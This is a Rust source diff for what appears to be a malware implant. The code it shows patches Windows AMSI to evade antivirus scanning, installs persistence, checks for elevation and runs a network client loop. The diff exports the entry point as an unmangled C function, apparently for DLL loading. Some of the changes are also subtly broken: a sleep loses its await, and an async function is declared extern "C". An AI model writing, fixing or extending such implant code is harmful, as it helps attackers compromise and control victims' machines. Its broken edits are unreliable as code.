@@ -19,6 +19,8 @@ use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
 use rand::Rng;
+use std::env;
+use anyhow::{Error};
 
 
 
@@ -236,8 +238,10 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
     }
 }
 
-/// Entry point
-pub async fn netclient() -> Result<()> {
+
+#[unsafe(no_mangle)]
+#[unsafe(export_name = "netclient")]
+pub async extern "C" fn netclient()-> Result<()>{
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
 
@@ -259,8 +263,8 @@ pub async fn netclient() -> Result<()> {
     persist::persist()?;
     #[cfg(target_os = "windows")]
     if !is_elevated(){
-        sleep(Duration::from_secs(61)).await;
+        sleep(Duration::from_secs(61));
     }
-    
-    netclient_run(ClientConfig::default()).await
+    netclient_run(ClientConfig::default()).await?;
+    return Ok(());
 }
